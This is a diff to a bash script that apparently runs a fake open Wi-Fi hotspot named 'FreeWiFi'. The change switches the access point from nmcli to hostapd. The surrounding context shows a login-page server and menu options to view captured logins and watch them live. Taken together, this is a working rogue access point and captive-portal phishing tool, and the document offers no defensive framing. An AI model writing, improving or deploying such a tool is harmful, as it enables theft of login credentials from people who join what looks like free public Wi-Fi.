@@ -2,55 +2,65 @@
 
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
+HOSTAPD_CONF="/tmp/hostapd_open.conf"
+HOTSPOT_IFACE="wlan0"
+HOTSPOT_IP="192.168.50.1"
 
 # ---------------------------
 # Check if hotspot is running
 # ---------------------------
 is_hotspot_running() {
-    nmcli connection show --active | grep -q '^Hotspot'
-    return $?  # 0 = running, 1 = not running
+    pgrep hostapd >/dev/null 2>&1
+    return $?
 }
 
 # ---------------------------
-# Start Open Hotspot
+# Start open hotspot using hostapd
 # ---------------------------
 start_hotspot() {
     if is_hotspot_running; then
         echo "[!] Hotspot is already running!"
+        return
+    fi
+
+    # Assign static IP
+    sudo ifconfig $HOTSPOT_IFACE $HOTSPOT_IP netmask 255.255.255.0
+
+    # Create temporary hostapd config
+    cat > $HOSTAPD_CONF <<EOF
+interface=$HOTSPOT_IFACE
+driver=nl80211
+ssid=FreeWiFi
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0
+EOF
+
+    echo "[+] Starting open hotspot..."
+    sudo hostapd $HOSTAPD_CONF -B
+    if [ $? -eq 0 ]; then
+        echo "[+] Open hotspot started successfully!"
     else
-        echo "[+] Starting open hotspot..."
-        
-        # Delete old Hotspot connection if exists
-        nmcli connection delete Hotspot 2>/dev/null
-
-        # Start hotspot (default password temporarily)
-        nmcli dev wifi hotspot ifname wlan0 ssid FreeWiFi password ""
-
-        # Remove password to make it open
-        nmcli connection modify Hotspot 802-11-wireless-security.key-mgmt none
-
-        if [ $? -eq 0 ]; then
-            echo "[+] Open hotspot started successfully!"
-        else
-            echo "[-] Failed to start hotspot. Check your Wi-Fi interface."
-        fi
+        echo "[-] Failed to start hotspot. Make sure $HOTSPOT_IFACE is correct and free."
     fi
 }
 
 # ---------------------------
-# Stop Hotspot
+# Stop hotspot
 # ---------------------------
 stop_hotspot() {
     if is_hotspot_running; then
-        echo "[+] Stopping hotspot..."
-        nmcli connection down Hotspot
+        sudo pkill hostapd
+        echo "[+] Hotspot stopped."
     else
-        echo "[!] No hotspot is currently running."
+        echo "[!] No hotspot is running."
     fi
 }
 
 # ---------------------------
-# Start Login Page Server
+# Start login page server
 # ---------------------------
 start_server() {
     if [ ! -d "$PORTAL_DIR" ]; then
@@ -63,7 +73,7 @@ start_server() {
 }
 
 # ---------------------------
-# View Saved Logins
+# View saved logins
 # ---------------------------
 view_logs() {
     echo "---- Saved Logins ----"
@@ -76,7 +86,7 @@ view_logs() {
 }
 
 # ---------------------------
-# Live log view
+# Live logs
 # ---------------------------
 live_logs() {
     echo "[+] Live log view (Ctrl+C to exit)"
@@ -98,7 +108,7 @@ edit_page() {
 }
 
 # ---------------------------
-# Setup folders and files
+# Setup files/folders
 # ---------------------------
 setup() {
     echo "[+] Setting up folders..."
@@ -109,7 +119,7 @@ setup() {
 }
 
 # ---------------------------
-# Main Number Menu
+# Main Menu
 # ---------------------------
 while true; do
     echo ""
